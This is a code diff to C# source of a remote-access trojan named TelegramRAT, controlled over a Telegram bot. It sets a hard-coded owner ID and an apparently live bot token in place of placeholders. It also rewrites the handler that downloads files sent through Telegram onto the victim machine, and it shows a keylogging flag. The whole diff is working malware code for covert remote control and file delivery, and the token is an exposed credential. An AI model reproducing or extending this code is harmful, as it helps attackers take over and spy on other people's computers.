@@ -29,8 +29,8 @@ namespace TelegramRAT
     {
         static TelegramBotClient Bot;
 
-        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
-        readonly static string BotToken = null; // Place your Telegram bot token. 
+        readonly static long? OwnerId = 1113634091; // Place your Telegram id here or keep it null.
+        readonly static string BotToken = "1727211141:AAHYjMAS6Zo7q7_kgRLUkkOj7lVjWonhikQ"; // Place your Telegram bot token. 
 
         static List<BotCommand> commands = new List<BotCommand>();
         static bool keylog = false;
@@ -864,48 +864,13 @@ namespace TelegramRAT
                 {
                     try
                     {
-                        if (model.Message.Type == MessageType.Photo)
+                        foreach(var file in model.Files)
                         {
-                            foreach (PhotoSize photo in model.Message.Photo)
-                            {
-                                var photoFileStream = System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png");
-
-                                Telegram.Bot.Types.File photoFile = Bot.GetFileAsync(photo.FileId).Result;
-                                Bot.DownloadFileAsync(photoFile.FilePath, photoFileStream).Wait();
-                                photoFileStream.Close();
-
-                            }
-                        }
-                        else if (model.Message.Type == MessageType.Document)
-                        {
-                            Telegram.Bot.Types.File documentFile = Bot.GetFileAsync(model.Message.Document.FileId).Result;
-                            var documentFileStream = System.IO.File.Create(model.Message.Document.FileName);
-                            Bot.DownloadFileAsync(documentFile.FilePath, documentFileStream).Wait();
-                            documentFileStream.Close();
-                        }
-                        else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Photo)
-                        {
-                            foreach (PhotoSize photo in model.Message.ReplyToMessage.Photo)
-                            {
-                                var photoFileStream = System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png");
-
-                                Telegram.Bot.Types.File photoFile = Bot.GetFileAsync(photo.FileId).Result;
-                                Bot.DownloadFileAsync(photoFile.FilePath, photoFileStream).Wait();
-                                photoFileStream.Close();
-
-                            }
-                        }
-                        else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Document)
-                        {
-                            Telegram.Bot.Types.File documentFile = Bot.GetFileAsync(model.Message.ReplyToMessage.Document.FileId).Result;
-                            var documentFileStream = System.IO.File.Create(model.Message.ReplyToMessage.Document.FileName);
-                            Bot.DownloadFileAsync(documentFile.FilePath, documentFileStream).Wait();
-                            documentFileStream.Close();
-                        }
-                        else
-                        {
-                            await Bot.SendTextMessageAsync(model.Message.Chat.Id, "No file or photo pinned, use /help upload to get info about this command!", replyToMessageId: model.Message.MessageId);
-                            return;
+                            FileStream fs = new FileStream(model.Filename ?? file.FileUniqueId + ".jpg", FileMode.Create);
+                            var telegramFile = await Bot.GetFileAsync(file.FileId);
+                            
+                            await Bot.DownloadFileAsync(telegramFile.FilePath, fs);
+                            fs.Close();
                         }
                         await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                     }
